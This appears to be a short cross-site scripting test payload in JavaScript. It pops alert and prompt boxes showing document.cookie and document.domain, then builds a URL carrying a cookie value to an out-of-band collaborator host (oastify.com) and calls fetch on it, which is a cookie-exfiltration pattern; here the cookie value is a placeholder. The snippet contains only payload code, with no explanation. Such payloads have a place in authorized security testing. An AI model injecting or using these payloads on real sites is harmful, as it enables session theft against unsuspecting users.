alert("1. 009")
alert("2. xss by Prod")
prompt("3. xss through prompt")
alert(document.cookie)
prompt(document.domain)

const cookieValue = "TestcookieValue";

const url = `http://fraqiqv4hfz631dzya9ae5dkvb11pq.oastify.com?cookie=${cookieValue}`;

fetch(url)
